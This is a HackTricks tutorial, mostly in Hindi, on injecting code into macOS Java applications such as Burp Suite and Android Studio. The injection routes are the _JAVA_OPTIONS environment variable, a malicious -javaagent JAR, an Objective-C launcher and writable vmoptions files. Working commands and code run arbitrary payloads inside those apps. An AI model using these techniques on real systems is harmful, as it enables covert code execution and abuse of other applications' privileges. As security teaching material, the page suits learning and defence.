# macOS Java Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Enumeration

अपने सिस्टम में स्थापित Java अनुप्रयोगों को खोजें। यह देखा गया कि **Info.plist** में Java ऐप्स कुछ जावा पैरामीटर शामिल करेंगे जिनमें स्ट्रिंग **`java.`** होगी, इसलिए आप इसके लिए खोज सकते हैं:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA\_OPTIONS

env वेरिएबल **`_JAVA_OPTIONS`** का उपयोग किसी java संकलित ऐप के निष्पादन में मनमाने java पैरामीटर को इंजेक्ट करने के लिए किया जा सकता है:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
नई प्रक्रिया के रूप में इसे निष्पादित करने के लिए और वर्तमान टर्मिनल के बच्चे के रूप में नहीं, आप उपयोग कर सकते हैं:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
हालांकि, यह निष्पादित ऐप पर एक त्रुटि को ट्रिगर करेगा, एक और अधिक छिपा हुआ तरीका एक जावा एजेंट बनाने और उपयोग करने का है:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
{% hint style="danger" %}
एजेंट को **विभिन्न Java संस्करण** के साथ बनाना एप्लिकेशन और एजेंट दोनों के निष्पादन को क्रैश कर सकता है
{% endhint %}

जहाँ एजेंट हो सकता है:

{% code title="Agent.java" %}
```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
{% endcode %}

एजेंट को संकलित करने के लिए चलाएँ:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
With `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
और फिर env वेरिएबल को एक्सपोर्ट करें और जावा एप्लिकेशन को इस तरह चलाएं:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions फ़ाइल

यह फ़ाइल **Java params** के विनिर्देशन का समर्थन करती है जब Java निष्पादित होता है। आप कुछ पिछले ट्रिक्स का उपयोग करके java params को बदल सकते हैं और **प्रक्रिया को मनमाने आदेश निष्पादित करने** के लिए बना सकते हैं।\
इसके अलावा, यह फ़ाइल `include` निर्देशिका के साथ **अन्य फ़ाइलों को भी शामिल** कर सकती है, इसलिए आप एक शामिल फ़ाइल को भी बदल सकते हैं।

यहां तक कि, कुछ Java ऐप्स **एक से अधिक `vmoptions`** फ़ाइलें लोड करेंगे।

कुछ अनुप्रयोग जैसे Android Studio अपने **आउटपुट में यह संकेत करते हैं कि वे इन फ़ाइलों के लिए कहाँ देख रहे हैं**, जैसे:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
यदि वे ऐसा नहीं करते हैं, तो आप इसे आसानी से जांच सकते हैं:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
नोट करें कि इस उदाहरण में Android Studio फ़ाइल **`/Applications/Android Studio.app.vmoptions`** को लोड करने की कोशिश कर रहा है, एक ऐसा स्थान जहाँ **`admin` समूह** के किसी भी उपयोगकर्ता को लिखने की अनुमति है।
